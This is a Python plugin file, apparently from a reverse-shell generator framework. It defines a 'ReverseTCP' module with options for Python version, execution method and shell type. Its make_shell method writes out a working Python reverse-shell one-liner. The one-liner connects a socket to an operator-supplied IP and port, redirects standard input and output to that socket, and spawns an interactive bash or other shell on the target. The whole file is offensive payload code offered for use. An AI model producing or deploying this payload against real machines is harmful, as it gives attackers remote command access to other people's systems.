from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()

        self.add_args(
            "--type",
            default="python",
            choices=[
                'python',
                'python2',
                'python3'
            ],
            help="Select python type: python, python2, python3 (default: python)"
        )

        self.add_args(
            "--exec",
            default="pty",
            choices=[
                'pty',
                'subprocess',
            ]
        )

        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[ReverseShell][TCP] Python from swisskyrepo/PayloadsAllTheThings. License MIT."
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"

    def make_shell(self):
        self.shell = """{} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
        socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),
        2);import pty; """.format(
            self.args.type, self.args.ip, self.args.port)
        if self.args.exec == "pty":
            self.shell += """pty.spawn("{}")'""".format(self.args.shell)
        elif self.args.exec == "subprocess":
            self.shell += """p=subprocess.call(["{}","-i"]);'""".format(self.args.shell)
